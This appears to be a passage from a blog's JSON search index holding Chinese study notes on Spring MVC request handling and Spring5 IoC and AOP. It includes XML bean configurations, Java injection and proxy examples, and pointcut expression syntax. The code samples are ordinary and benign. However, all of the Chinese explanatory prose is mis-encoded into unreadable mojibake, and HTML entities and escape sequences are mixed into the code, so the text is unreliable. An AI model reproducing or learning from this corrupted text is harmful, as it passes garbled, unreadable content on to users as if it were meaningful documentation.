å°†è¯·æ±‚æ¶ˆæ¯ï¼ˆå¦‚Jsonã€xmlç­‰æ•°æ®ï¼‰è½¬æ¢æˆä¸€ä¸ªå¯¹è±¡ï¼Œå°†å¯¹è±¡è½¬æ¢ä¸ºæŒ‡å®šçš„å“åº”ä¿¡æ¯ b) æ•°æ®è½¬æ¢ï¼šå¯¹è¯·æ±‚æ¶ˆæ¯è¿›è¡Œæ•°æ®è½¬æ¢ã€‚å¦‚Stringè½¬æ¢æˆIntegerã€Doubleç­‰ c) æ•°æ®æ ¼å¼åŒ–ï¼šå¯¹è¯·æ±‚æ¶ˆæ¯è¿›è¡Œæ•°æ®æ ¼å¼åŒ–ã€‚ å¦‚å°†å­—ç¬¦ä¸²è½¬æ¢æˆæ ¼å¼åŒ–æ•°å­—æˆ–æ ¼å¼åŒ–æ—¥æœŸç­‰ d) æ•°æ®éªŒè¯ï¼š éªŒè¯æ•°æ®çš„æœ‰æ•ˆæ€§ï¼ˆé•¿åº¦ã€æ ¼å¼ç­‰ï¼‰ï¼ŒéªŒè¯ç»“æœå­˜å‚¨åˆ°BindingResultæˆ–Errorä¸­ Handleræ‰§è¡Œå®Œæˆåï¼Œå‘DispatcherServlet è¿”å›ä¸€ä¸ªModelAndViewå¯¹è±¡ã€‚\næ­¤æ—¶å°†å¼€å§‹æ‰§è¡Œæ‹¦æˆªå™¨çš„postHandle(\u0026hellip;)æ–¹æ³•ã€é€†å‘ã€‘ã€‚\næ ¹æ®è¿”å›çš„ModelAndViewï¼ˆæ­¤æ—¶ä¼šåˆ¤æ–­æ˜¯å¦å­˜åœ¨å¼‚å¸¸ï¼šå¦‚æœå­˜åœ¨å¼‚å¸¸ï¼Œåˆ™æ‰§è¡ŒHandlerExceptionResolverè¿›è¡Œå¼‚å¸¸å¤„ç†ï¼‰é€‰æ‹©ä¸€ä¸ªé€‚åˆçš„ViewResolverè¿›è¡Œè§†å›¾è§£æï¼Œæ ¹æ®Modelå’ŒViewï¼Œæ¥æ¸²æŸ“è§†å›¾ã€‚\næ¸²æŸ“è§†å›¾å®Œæ¯•æ‰§è¡Œæ‹¦æˆªå™¨çš„afterCompletion(â€¦)æ–¹æ³•ã€é€†å‘ã€‘ã€‚\nå°†æ¸²æŸ“ç»“æœè¿”å›ç»™å®¢æˆ·ç«¯ã€‚\n","permalink":"http://www.reus09.top/posts/tech/spring-mvc/","summary":"Spring-mvc æœ¬ç¯‡ä¸»è¦å¯¹spring-mvcçš„çŸ¥è¯†ç‚¹è¿›è¡Œæ€»ç»“ MVCçš„å·¥ä½œæµç¨‹ï¼š ç”¨æˆ·é€šè¿‡è§†å›¾å±‚å‘é€è¯·æ±‚åˆ°æœåŠ¡å™¨ï¼Œåœ¨æœåŠ¡å™¨ä¸­è¯·æ±‚è¢«Controlleræ¥æ”¶ï¼Œ","title":"Spring Mvc"},{"content":"Spring5 æ¡†æ¶ è¿™é‡Œä¸»è¦å­¦ä¹ äº†Spring5çš„ç›¸å…³çŸ¥è¯†ï¼Œå¯¹iocå’ŒAopçš„ç›¸å…³çŸ¥è¯†è¿›è¡Œæ•´ç† 0x01 IOC æ¦‚å¿µ æ§åˆ¶åè½¬ï¼ŒæŠŠåˆ›å»ºå¯¹è±¡è¿‡ç¨‹äº¤ç»™ Spring è¿›è¡Œç®¡ç† ä½¿ç”¨ç›®çš„ï¼š ä¸ºäº†è€¦åˆåº¦é™ä½ åº•å±‚åŸç† xml è§£æã€å·¥å‚æ¨¡å¼ã€åå°„ IOC æ€æƒ³åŸºäº IOC å®¹å™¨å®Œæˆï¼ŒIOC å®¹å™¨åº•å±‚å°±æ˜¯å¯¹è±¡å·¥å‚ 1.1 å®ç°æ–¹å¼ BeanFactoryï¼šIOC å®¹å™¨åŸºæœ¬å®ç°ï¼Œæ˜¯ Spring å†…éƒ¨çš„ä½¿ç”¨æ¥å£ï¼Œä¸æä¾›å¼€å‘äººå‘˜è¿›è¡Œä½¿ç”¨ åŠ è½½é…ç½®æ–‡ä»¶æ—¶å€™ä¸ä¼šåˆ›å»ºå¯¹è±¡ï¼Œåœ¨è·å–å¯¹è±¡ï¼ˆä½¿ç”¨ï¼‰æ‰å»åˆ›å»ºå¯¹è±¡ ApplicationContextï¼šBeanFactory æ¥å£çš„å­æ¥å£ï¼Œæä¾›æ›´å¤šæ›´å¼ºå¤§çš„åŠŸèƒ½ï¼Œä¸€èˆ¬ç”±å¼€å‘äºº å‘˜è¿›è¡Œä½¿ç”¨ åŠ è½½é…ç½®æ–‡ä»¶æ—¶å€™å°±ä¼šæŠŠåœ¨é…ç½®æ–‡ä»¶å¯¹è±¡è¿›è¡Œåˆ›å»º Beanç®¡ç† Springåˆ›å»ºå¯¹è±¡ Springæ³¨å…¥å±æ€§ å®ç°æ–¹æ³• åŸºäºxmlé…ç½®æ–‡ä»¶æ–¹å¼å®ç° åŸºäºæ³¨è§£æ–¹å¼å®ç° 1.2 xmlé…ç½®æ–‡ä»¶ 1.2.1 åˆ›å»ºå¯¹è±¡ åœ¨ spring é…ç½®æ–‡ä»¶ä¸­ï¼Œä½¿ç”¨ bean æ ‡ç­¾ï¼Œæ ‡ç­¾é‡Œé¢æ·»åŠ å¯¹åº”å±æ€§ï¼Œå°±å¯ä»¥å®ç°å¯¹è±¡åˆ›å»º åœ¨ bean æ ‡ç­¾æœ‰å¾ˆå¤šå±æ€§ï¼Œä»‹ç»å¸¸ç”¨çš„å±æ€§ * id å±æ€§:å”¯ä¸€æ ‡è¯† class å±æ€§:ç±»å…¨è·¯å¾„ï¼ˆåŒ…ç±»è·¯å¾„) åˆ›å»ºå¯¹è±¡æ—¶å€™ï¼Œé»˜è®¤ä¹Ÿæ˜¯æ‰§è¡Œæ— å‚æ•°æ„é€ æ–¹æ³•å®Œæˆå¯¹è±¡åˆ›å»º 1 \u0026lt;bean id=\u0026#34;user\u0026#34; class=\u0026#34;com.atguigu.spring5.User\u0026#34;\u0026gt;\u0026lt;/bean\u0026gt; 1.2.2 æ³¨å…¥å±æ€§ DIï¼šä¾èµ–æ³¨å…¥ï¼Œå°±æ˜¯æ³¨å…¥å±æ€§ 1.2.2.1 setæ–¹æ³•æ³¨å…¥ è¿™ä¸ªæ³¨å…¥æ–¹æ³•ç±»ä¸­å¿…é¡»è¦æœ‰setæ–¹æ³•ï¼Œä½¿ç”¨propertyå±æ€§\n1 2 3 4 \u0026lt;bean id=\u0026#34;book\u0026#34; class=\u0026#34;com.atguigu.spring5.Book\u0026#34;\u0026gt; \u0026lt;!--ä½¿ç”¨ property å®Œæˆå±æ€§æ³¨å…¥ nameï¼šç±»é‡Œé¢å±æ€§åç§° valueï¼šå‘å±æ€§æ³¨å…¥çš„å€¼ --\u0026gt; \u0026lt;property name=\u0026#34;bname\u0026#34; value=\u0026#34;æ˜“ç­‹ç»\u0026#34;\u0026gt;\u0026lt;/property\u0026gt; \u0026lt;/bean\u0026gt; è¿™ä¸ªåœ¨bookä¸­å¯¹äºç±»ä¸­çš„å…ƒç´ å¿…é¡»å®ç°äº†setBnameæ–¹æ³•\n1 2 public void setBname(String bname) { this.bname = bname; } 1.2.2.2 æœ‰å‚æ•°æ„é€ æ³¨å…¥ è¿™ä¸ªæ³¨å…¥æ–¹å¼ï¼Œæ„é€ ç±»ä¸­å¿…é¡»æœ‰å¯¹åº”çš„æ„é€ æ–¹æ³•ã€‚æ„é€ æ–¹æ³•å«æœ‰å‡ ä¸ªå‚æ•°ä¾¿åœ¨beanä¸­æ·»åŠ å‡ ä¸ªå…ƒç´ ï¼Œä½¿ç”¨constructor-argå±æ€§è¿›è¡Œé…ç½®\n1 2 3 4 \u0026lt;bean id=\u0026#34;orders\u0026#34; class=\u0026#34;com.atguigu.spring5.Orders\u0026#34;\u0026gt; \u0026lt;constructor-arg name=\u0026#34;oname\u0026#34; value=\u0026#34;ç”µè„‘\u0026#34;\u0026gt;\u0026lt;/constructor-arg\u0026gt; \u0026lt;constructor-arg name=\u0026#34;address\u0026#34; value=\u0026#34;China\u0026#34;\u0026gt;\u0026lt;/constructor-arg\u0026gt; \u0026lt;/bean\u0026gt; å¯¹åº”çš„æ„é€ æ–¹æ³•ä¸º\n1 2 3 4 5 public Orders(String oname,String address) { this.oname = oname; this.address = address; } 1.2.2.3 påç§°ç©ºé—´æ³¨å…¥ éœ€è¦åœ¨beanä¸­å¯¼å…¥http://www.springframework.org/schema/pä¸­çš„å·¥å…·è¿›è¡Œçº¦æŸ\nè¿™é‡Œä»¥ä½¿ç”¨setæ–¹æ³•çš„æ³¨å…¥ä¸ºä¾‹\n1 \u0026lt;bean id=\u0026#34;book\u0026#34; class=\u0026#34;com.atguigu.spring5.Book\u0026#34; p:bname=\u0026#34;ä¹é˜³ç¥åŠŸ\u0026#34; p:bauthor=\u0026#34;æ— åæ°\u0026#34;\u0026gt;\u0026lt;/bean\u0026gt; 1.2.2.4 å…¶ä»–ç±»å‹å±æ€§æ³¨å…¥ å­—é¢é‡\nnullå€¼ï¼Œç”¨\u0026lt;null/\u0026gt;æ¥ä¿®é¥°å³å¯\nå±æ€§åŒ…å«ç‰¹æ®Šå€¼ï¼Œæ¯”å¦‚\u0026lt;æˆ–\u0026gt;\næ³•ä¸€ï¼šå€ŸåŠ©\u0026amp;ltï¼Œ\u0026amp;gtç­‰è½¬ä¹‰ç¬¦\næ³•äºŒï¼šä½¿ç”¨CDATA\n1 2 3 \u0026lt;property name=\u0026#34;address\u0026#34;\u0026gt; \u0026lt;value\u0026gt;\u0026lt;![CDATA[\u0026lt;\u0026lt;å—äº¬\u0026gt;\u0026gt;]]\u0026gt;\u0026lt;/value\u0026gt; \u0026lt;/property\u0026gt; æ³¨å…¥å¤–éƒ¨å±æ€§\nåœ¨ä¸€ä¸ªç±»ä¸­ï¼Œå¦ä¸€ä¸ªç±»æ³¨å…¥åˆ°è¿™ä¸ªç±»ä¸­ï¼Œå¯ä»¥å…ˆåˆ›å»ºä¸¤ä¸ªå¯¹åº”çš„å¯¹è±¡åï¼Œä½¿ç”¨refå±æ€§ï¼Œå°†ç±»æ³¨å…¥åˆ°éœ€è¦æ³¨å…¥çš„ç±»ä¸­\nå¤–éƒ¨bean\n1 2 3 4 5 6 7 \u0026lt;!--1 service å’Œ dao å¯¹è±¡åˆ›å»º--\u0026gt; \u0026lt;bean id=\u0026#34;userService\u0026#34; class=\u0026#34;com.atguigu.spring5.service.UserService\u0026#34;\u0026gt; \u0026lt;!--æ³¨å…¥ userDao å¯¹è±¡ name å±æ€§ï¼šç±»é‡Œé¢å±æ€§åç§° ref å±æ€§ï¼šåˆ›å»º userDao å¯¹è±¡ bean æ ‡ç­¾ id å€¼ --\u0026gt; \u0026lt;property name=\u0026#34;userDao\u0026#34; ref=\u0026#34;userDaoImpl\u0026#34;\u0026gt;\u0026lt;/property\u0026gt; \u0026lt;/bean\u0026gt; \u0026lt;bean id=\u0026#34;userDaoImpl\u0026#34; class=\u0026#34;com.atguigu.spring5.dao.UserDaoImpl\u0026#34;\u0026gt;\u0026lt;/bean\u0026gt; å†…éƒ¨beançš„æ“ä½œå°±ä¸åœ¨èµ˜è¿°ï¼Œä¸ä¸Šè¿°ç±»ä¼¼\nçº§è”èµ‹å€¼\nå³è¢«æ³¨å…¥çš„ç±»ä¸­ä¹Ÿéœ€è¦å…ƒç´ è¿›è¡Œæ³¨å…¥ å¯ä»¥ç›´æ¥ref ä¹Ÿå¯ä»¥åœ¨refåï¼Œåˆ©ç”¨class.ssåˆ¶å®šå¯¹åº”çš„ç±»ä¸­å…ƒç´ è¿›è¡Œèµ‹å€¼(è¿™é‡Œçš„sså€ŸæŒ‡å¯¹åº”çš„ç±»ä¸­å…ƒç´ ) æ³¨å…¥é›†åˆç±»å‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 \u0026lt;!--1 é›†åˆç±»å‹å±æ€§æ³¨å…¥--\u0026gt; \u0026lt;bean id=\u0026#34;stu\u0026#34; class=\u0026#34;com.atguigu.spring5.collectiontype.Stu\u0026#34;\u0026gt; \u0026lt;!--æ•°ç»„ç±»å‹å±æ€§æ³¨å…¥--\u0026gt; \u0026lt;property name=\u0026#34;courses\u0026#34;\u0026gt; \u0026lt;array\u0026gt; \u0026lt;value\u0026gt;java è¯¾ç¨‹\u0026lt;/value\u0026gt; \u0026lt;value\u0026gt;æ•°æ®åº“è¯¾ç¨‹\u0026lt;/value\u0026gt; \u0026lt;/array\u0026gt; \u0026lt;/property\u0026gt; \u0026lt;!--list ç±»å‹å±æ€§æ³¨å…¥--\u0026gt; \u0026lt;property name=\u0026#34;list\u0026#34;\u0026gt; \u0026lt;list\u0026gt; \u0026lt;value\u0026gt;å¼ ä¸‰\u0026lt;/value\u0026gt; \u0026lt;value\u0026gt;å°ä¸‰\u0026lt;/value\u0026gt; \u0026lt;/list\u0026gt; \u0026lt;/property\u0026gt; \u0026lt;!--map ç±»å‹å±æ€§æ³¨å…¥--\u0026gt; \u0026lt;property name=\u0026#34;maps\u0026#34;\u0026gt; \u0026lt;map\u0026gt; \u0026lt;entry key=\u0026#34;JAVA\u0026#34; value=\u0026#34;java\u0026#34;\u0026gt;\u0026lt;/entry\u0026gt; \u0026lt;entry key=\u0026#34;PHP\u0026#34; value=\u0026#34;php\u0026#34;\u0026gt;\u0026lt;/entry\u0026gt; \u0026lt;/map\u0026gt; \u0026lt;/property\u0026gt; \u0026lt;!--set ç±»å‹å±æ€§æ³¨å…¥--\u0026gt; \u0026lt;property name=\u0026#34;sets\u0026#34;\u0026gt; \u0026lt;set\u0026gt; \u0026lt;value\u0026gt;MySQL\u0026lt;/value\u0026gt; \u0026lt;value\u0026gt;Redis\u0026lt;/value\u0026gt; \u0026lt;/set\u0026gt; \u0026lt;/property\u0026gt; \u0026lt;/bean\u0026gt; arrayå¼•å…¥arrayæ ‡ç­¾,listå¼•å…¥listï¼Œmapå¼•å…¥mapå’Œentryï¼Œsetå¼•å…¥setæ ‡ç­¾ 1.2.3 FactoryBean Spring æœ‰ä¸¤ç§ç±»å‹ beanï¼Œ\nä¸€ç§æ™®é€š bean åœ¨é…ç½®æ–‡ä»¶ä¸­å®šä¹‰ bean ç±»å‹å°±æ˜¯è¿”å›ç±»å‹ å¦å¤–ä¸€ç§å·¥å‚ beanï¼ˆFactoryBean) åœ¨é…ç½®æ–‡ä»¶å®šä¹‰ bean ç±»å‹å¯ä»¥å’Œè¿”å›ç±»å‹ä¸ä¸€æ · å®ç°æ–¹æ³•\nåˆ›å»ºç±»ï¼Œè®©è¿™ä¸ªç±»ä½œä¸ºå·¥å‚ beanï¼Œå®ç°æ¥å£ FactoryBean å®ç°æ¥å£é‡Œé¢çš„æ–¹æ³•ï¼Œåœ¨å®ç°çš„æ–¹æ³•ä¸­å®šä¹‰è¿”å›çš„ bean ç±»å‹ å€Ÿç”¨FactoryBeanæ¥å£æ¥å®ç°\n1 2 3 4 5 6 7 8 9 10 11 12 13 public interface FactoryBean\u0026lt;T\u0026gt; { String OBJECT_TYPE_ATTRIBUTE = \u0026#34;factoryBeanObjectType\u0026#34;; @Nullable T getObject() throws Exception; @Nullable Class\u0026lt;?\u0026gt; getObjectType(); default boolean isSingleton() { return true; } } 1.2.4 Beanä½œç”¨åŸŸ åœ¨ Spring é‡Œé¢ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œbean æ˜¯å•å®ä¾‹å¯¹è±¡ åœ¨ spring é…ç½®æ–‡ä»¶ bean æ ‡ç­¾é‡Œé¢æœ‰å±æ€§ï¼ˆscopeï¼‰ç”¨äºè®¾ç½®å•å®ä¾‹è¿˜æ˜¯å¤šå®ä¾‹ scope å±æ€§å€¼ ç¬¬ä¸€ä¸ªå€¼ é»˜è®¤å€¼ï¼Œsingletonï¼Œè¡¨ç¤ºæ˜¯å•å®ä¾‹å¯¹è±¡ ç¬¬äºŒä¸ªå€¼ prototypeï¼Œè¡¨ç¤ºæ˜¯å¤šå®ä¾‹å¯¹è±¡ 1.2.5 ç”Ÿå‘½å‘¨æœŸ ï¼ˆ1ï¼‰é€šè¿‡æ„é€ å™¨åˆ›å»º bean å®ä¾‹ï¼ˆæ— å‚æ•°æ„é€ ï¼‰\nï¼ˆ2ï¼‰ä¸º bean çš„å±æ€§è®¾ç½®å€¼å’Œå¯¹å…¶ä»– bean å¼•ç”¨ï¼ˆè°ƒç”¨ set æ–¹æ³•ï¼‰\nï¼ˆ3ï¼‰è°ƒç”¨ bean çš„åˆå§‹åŒ–çš„æ–¹æ³•ï¼ˆéœ€è¦è¿›è¡Œé…ç½®åˆå§‹åŒ–çš„æ–¹æ³•ï¼‰\nï¼ˆ4ï¼‰bean å¯ä»¥ä½¿ç”¨äº†ï¼ˆå¯¹è±¡è·å–åˆ°äº†ï¼‰\nï¼ˆ5ï¼‰å½“å®¹å™¨å…³é—­æ—¶å€™ï¼Œè°ƒç”¨ bean çš„é”€æ¯çš„æ–¹æ³•ï¼ˆéœ€è¦è¿›è¡Œé…ç½®é”€æ¯çš„æ–¹æ³•ï¼‰\nè¿™é‡Œä»¥ä»£ç ä¸ºä¾‹\n1 2 3 \u0026lt;bean id=\u0026#34;orders\u0026#34; class=\u0026#34;com.atguigu.spring5.bean.Orders\u0026#34; init-method=\u0026#34;initMethod\u0026#34; destroy-method=\u0026#34;destroyMethod\u0026#34;\u0026gt; \u0026lt;property name=\u0026#34;oname\u0026#34; value=\u0026#34;æ‰‹æœº\u0026#34;\u0026gt;\u0026lt;/property\u0026gt; \u0026lt;/bean\u0026gt; åˆ©ç”¨init-methodï¼Œdestory-methodä¸¤ä¸ªå±æ€§æ‰§è¡Œåˆå§‹åŒ–æ–¹æ³•å’Œé”€æ¯æ–¹æ³• åŠ ä¸Šåç½®å¤„ç†å™¨ï¼Œbeanç”Ÿå‘½å‘¨æœŸå…±æœ‰ä¸ƒæ­¥\nï¼ˆ1ï¼‰é€šè¿‡æ„é€ å™¨åˆ›å»º bean å®ä¾‹ï¼ˆæ— å‚æ•°æ„é€ ï¼‰ ï¼ˆ2ï¼‰ä¸º bean çš„å±æ€§è®¾ç½®å€¼å’Œå¯¹å…¶ä»– bean å¼•ç”¨ï¼ˆè°ƒç”¨ set æ–¹æ³•ï¼‰ ï¼ˆ3ï¼‰æŠŠ bean å®ä¾‹ä¼ é€’ bean åç½®å¤„ç†å™¨çš„æ–¹æ³• postProcessBeforeInitialization ï¼ˆ4ï¼‰è°ƒç”¨ bean çš„åˆå§‹åŒ–çš„æ–¹æ³•ï¼ˆéœ€è¦è¿›è¡Œé…ç½®åˆå§‹åŒ–çš„æ–¹æ³•ï¼‰ ï¼ˆ5ï¼‰æŠŠ bean å®ä¾‹ä¼ é€’ bean åç½®å¤„ç†å™¨çš„æ–¹æ³• postProcessAfterInitialization ï¼ˆ6ï¼‰bean å¯ä»¥ä½¿ç”¨äº†ï¼ˆå¯¹è±¡è·å–åˆ°äº†ï¼‰ ï¼ˆ7ï¼‰å½“å®¹å™¨å…³é—­æ—¶å€™ï¼Œè°ƒç”¨ bean çš„é”€æ¯çš„æ–¹æ³•ï¼ˆéœ€è¦è¿›è¡Œé…ç½®é”€æ¯çš„æ–¹æ³•ï¼‰ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 public class MyBeanPost implements BeanPostProcessor { @Override public Object postProcessBeforeInitialization(Object bean, String beanName) throws BeansException { System.out.println(\u0026#34;åœ¨åˆå§‹åŒ–ä¹‹å‰æ‰§è¡Œçš„æ–¹æ³•\u0026#34;); return bean; } @Override public Object postProcessAfterInitialization(Object bean, String beanName) throws BeansException { System.out.println(\u0026#34;åœ¨åˆå§‹åŒ–ä¹‹åæ‰§è¡Œçš„æ–¹æ³•\u0026#34;); return bean; } } xmlé…ç½®,å…¨å±€å¼€å¯åç½®å¤„ç†å™¨\n1 \u0026lt;bean id=\u0026#34;myBeanPost\u0026#34; class=\u0026#34;com.atguigu.spring5.bean.MyBeanPost\u0026#34;\u0026gt;\u0026lt;/bean\u0026gt; 1.2.6 è‡ªåŠ¨è£…é… bean æ ‡ç­¾å±æ€§ autowireï¼Œé…ç½®è‡ªåŠ¨è£…é… autowire å±æ€§å¸¸ç”¨ä¸¤ä¸ªå€¼ï¼š byName æ ¹æ®å±æ€§åç§°æ³¨å…¥ ,æ³¨å…¥å€¼ bean çš„ id å€¼å’Œç±»å±æ€§åç§°ä¸€æ · byType æ ¹æ®å±æ€§ç±»å‹æ³¨å…¥ 1.3 åŸºäºæ³¨è§£æ–¹å¼ ï¼ˆ1ï¼‰æ³¨è§£æ˜¯ä»£ç ç‰¹æ®Šæ ‡è®°ï¼Œæ ¼å¼ï¼š@æ³¨è§£åç§°(å±æ€§åç§°=å±æ€§å€¼, å±æ€§åç§°=å±æ€§å€¼..)\nï¼ˆ2ï¼‰ä½¿ç”¨æ³¨è§£ï¼Œæ³¨è§£ä½œç”¨åœ¨ç±»ä¸Šé¢ï¼Œæ–¹æ³•ä¸Šé¢ï¼Œå±æ€§ä¸Šé¢\nï¼ˆ3ï¼‰ä½¿ç”¨æ³¨è§£ç›®çš„ï¼šç®€åŒ– xml é…ç½®\nSpring é’ˆå¯¹ Bean ç®¡ç†ä¸­åˆ›å»ºå¯¹è±¡æä¾›æ³¨è§£\n@Component:å¸¸ç”¨äºæ­£å¸¸çš„ç»„ä»¶ @Service :å¸¸ç”¨äºserviceå±‚ @Controller ï¼šå¸¸ç”¨äºcontrollerå±‚ @Repository : å¸¸ç”¨äºdaoå±‚ ä¸Šé¢å››ä¸ªæ³¨è§£åŠŸèƒ½æ˜¯ä¸€æ ·çš„ï¼Œéƒ½å¯ä»¥ç”¨æ¥åˆ›å»º bean å®ä¾‹ï¼Œåªæ˜¯ä½œç”¨çš„å±‚æ¬¡ä¸ä¸€æ · ä½¿ç”¨æ³¨è§£éœ€è¦å¼€å¯æ³¨è§£æ‰«æ\nxml\n1 \u0026lt;context:component-scan base-package=\u0026#34;com.atguigu\u0026#34;\u0026gt;\u0026lt;/context:component-scan\u0026gt; çº¯ä»£ç ,éœ€è¦åˆ›å»ºé…ç½®ç±»\n1 2 3 @Configuration //ä½œä¸ºé…ç½®ç±»ï¼Œæ›¿ä»£ xml é…ç½®æ–‡ä»¶ @ComponentScan(basePackages = {\u0026#34;com.atguigu\u0026#34;}) public class SpringConfig { } åŸºäºæ³¨è§£æ–¹å¼å®ç°å±æ€§æ³¨å…¥\n@Autowiredï¼šæ ¹æ®å±æ€§ç±»å‹è¿›è¡Œè‡ªåŠ¨è£…é…\né¦–å…ˆæŒ‰ç…§ç±»å‹å»å®¹å™¨ä¸­æ‰¾å¯¹åº”çš„ç»„ä»¶ï¼Œå¦‚æœæ‰¾åˆ°ä¸€ä¸ªå°±èµ‹å€¼ï¼Œæ‰¾ä¸åˆ°å°±æŠ›å¼‚å¸¸ï¼› å¦‚æœæœ‰å¤šä¸ªç±»å‹åŒ¹é…æ—¶ï¼Œä¼šä½¿ç”¨è¦æ³¨å…¥çš„å¯¹è±¡å˜é‡åç§°ä½œä¸ºbeançš„idï¼Œåœ¨springå®¹å™¨æŸ¥æ‰¾ï¼Œæ‰¾åˆ°äº†ä¹Ÿå¯ä»¥æ³¨å…¥æˆåŠŸï¼Œæ‰¾ä¸åˆ°å°±æŠ¥é”™ã€‚ ç»“åˆæ³¨è§£@Qualiferï¼ŒæŒ‡å®šä¸€ä¸ªidï¼šåœ¨è‡ªåŠ¨æŒ‰ç…§ç±»å‹æ³¨å…¥çš„åŸºç¡€ä¹‹ä¸Šï¼Œå†æŒ‰ç…§æŒ‡å®šçš„beançš„idå»æŸ¥æ‰¾ã€‚å®ƒåœ¨ç»™å­—æ®µæ³¨å…¥æ—¶ä¸èƒ½ç‹¬ç«‹ä½¿ç”¨ï¼Œå¿…é¡»å’Œ@Autowiredä¸€èµ·ä½¿ç”¨ï¼›ä½†æ˜¯ç»™æ–¹æ³•å‚æ•°æ³¨å…¥æ—¶ï¼Œå¯ä»¥ç‹¬ç«‹ä½¿ç”¨ã€‚ 1 2 3 4 5 6 7 8 9 10 11 @Service public class UserService { //å®šä¹‰ dao ç±»å‹å±æ€§ //ä¸éœ€è¦æ·»åŠ  set æ–¹æ³• //æ·»åŠ æ³¨å…¥å±æ€§æ³¨è§£ @Autowired private UserDao userDao; public void add() { System.out.println(\u0026#34;service add.......\u0026#34;); userDao.add(); } } @Qualifierï¼šæ ¹æ®åç§°è¿›è¡Œæ³¨å…¥ è¿™ä¸ª@Qualifier æ³¨è§£çš„ä½¿ç”¨ï¼Œå’Œä¸Šé¢@Autowired ä¸€èµ·ä½¿ç”¨\n1 2 3 4 5 //å®šä¹‰ dao ç±»å‹å±æ€§ //ä¸éœ€è¦æ·»åŠ  set æ–¹æ³• //æ·»åŠ æ³¨å…¥å±æ€§æ³¨è§£ @Autowired //æ ¹æ®ç±»å‹è¿›è¡Œæ³¨å…¥ @Qualifier(value = \u0026#34;userDaoImpl1\u0026#34;) //æ ¹æ®åç§°è¿›è¡Œæ³¨å…¥ private UserDao userDao; @Resourceï¼šå¯ä»¥æ ¹æ®ç±»å‹æ³¨å…¥ï¼Œå¯ä»¥æ ¹æ®åç§°æ³¨å…¥\n1 2 3 4 //@Resource //æ ¹æ®ç±»å‹è¿›è¡Œæ³¨å…¥ @Resource(name = \u0026#34;userDaoImpl1\u0026#34;) private UserDao userDao; @Valueï¼šæ³¨å…¥æ™®é€šç±»å‹å±æ€§\n1 2 @Value(value = \u0026#34;abc\u0026#34;) private String name; 1.4 å®ç°IOCå®¹å™¨ä¸­å¯¹è±¡çš„è·å– xml\n1 2 3 ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext(\u0026#34;spring-config.xml\u0026#34;); Object obj = context.getBean(\u0026#34;obj\u0026#34;, Object.class); å…¨æ³¨è§£\nconfigå†™çš„æ˜¯å®ç°IOCæ‰«æçš„é…ç½®ç±» 1 2 3 ApplicationContext context = new AnnotationConfigApplicationContext(Config.class); Object obj = context.getBean(\u0026#34;obj\u0026#34;, Object.class); 0x02 Aop æ¦‚å¿µ é¢å‘åˆ‡é¢ï¼Œä¸ä¿®æ”¹æºä»£ç è¿›è¡ŒåŠŸèƒ½å¢å¼º é¢å‘åˆ‡é¢ç¼–ç¨‹ï¼ˆæ–¹é¢ï¼‰ï¼Œåˆ©ç”¨ AOP å¯ä»¥å¯¹ä¸šåŠ¡é€»è¾‘çš„å„ä¸ªéƒ¨åˆ†è¿›è¡Œéš”ç¦»ï¼Œä»è€Œä½¿å¾— ä¸šåŠ¡é€»è¾‘å„éƒ¨åˆ†ä¹‹é—´çš„è€¦åˆåº¦é™ä½ï¼Œæé«˜ç¨‹åºçš„å¯é‡ç”¨æ€§ï¼ŒåŒæ—¶æé«˜äº†å¼€å‘çš„æ•ˆç‡ã€‚ åº•å±‚åŸç† AOP åº•å±‚ä½¿ç”¨åŠ¨æ€ä»£ç† 2.1 åŠ¨æ€ä»£ç† ä½¿ç”¨æ–¹æ³•newProxyInstance\n1 2 3 4 5 6 7 8 9 10 11 12 13 public static Object newProxyInstance(ClassLoader loader, Class\u0026lt;?\u0026gt;[] interfaces, InvocationHandler h) throws IllegalArgumentException Returns an instance of a proxy class for the specified interfaces that dispatches method invocations to the specified invocation handler. Proxy.newProxyInstance throws IllegalArgumentException for the same reasons that Proxy.getProxyClass does. Parameters: loader - the class loader to define the proxy class interfaces - the list of interfaces for the proxy class to implement h - the invocation handler to dispatch method invocations to Returns: a proxy instance with the specified invocation handler of a proxy class that is defined by the specified class loader and that implements the specified interfaces æ–¹æ³•æœ‰ä¸‰ä¸ªå‚æ•°ï¼š\nç¬¬ä¸€å‚æ•°ï¼Œç±»åŠ è½½å™¨ ç¬¬äºŒå‚æ•°ï¼Œå¢å¼ºæ–¹æ³•æ‰€åœ¨çš„ç±»ï¼Œè¿™ä¸ªç±»å®ç°çš„æ¥å£ï¼Œæ”¯æŒå¤šä¸ªæ¥å£ ç¬¬ä¸‰å‚æ•°ï¼Œå®ç°è¿™ä¸ªæ¥å£ InvocationHandlerï¼Œåˆ›å»ºä»£ç†å¯¹è±¡ï¼Œå†™å¢å¼ºçš„éƒ¨åˆ† å¤„ç†çš„å¢å¼ºç»“æœæ˜¯å€Ÿç”¨InvocationHandleræ¥å£çš„invokeæ–¹æ³•\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 class UserDaoProxy implements InvocationHandler{ private Object obj; public UserDaoProxy(Object obj) { this.obj = obj; } @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { System.out.println(\u0026#34;å‘æ”¾ä¹‹å‰æ‰§è¡Œ....\u0026#34;+method.getName()+\u0026#34;å‚æ•°ï¼š\u0026#34;+ Arrays.toString(args)); Object res = method.invoke(obj,args); System.out.println(\u0026#34;æ–¹æ³•ä¹‹åæ‰§è¡Œ\u0026#34;); return res; } } 2.2 Aopæœ¯è¯­ è¿æ¥ç‚¹\nç±»é‡Œé¢å“ªäº›æ–¹æ³•å¯ä»¥è¢«å¢å¼ºï¼Œå±äºè¿æ¥ç‚¹ åˆ‡å…¥ç‚¹\nå®é™…è¢«å¢å¼ºçš„æ–¹æ³•ï¼Œæˆä¸ºåˆ‡å…¥ç‚¹\nè¡¨è¾¾å¼\n1 2 3 4 5 6 7 8 9 10 11 execution([æƒé™ä¿®é¥°ç¬¦] [è¿”å›ç±»å‹] [ç±»å…¨è·¯å¾„] [æ–¹æ³•åç§°]([å‚æ•°åˆ—è¡¨]) ) ä¸¾ä¾‹ 1ï¼šå¯¹ com.atguigu.dao.BookDao ç±»é‡Œé¢çš„ add è¿›è¡Œå¢å¼º execution(* com.atguigu.dao.BookDao.add(..)) ä¸¾ä¾‹ 2ï¼šå¯¹ 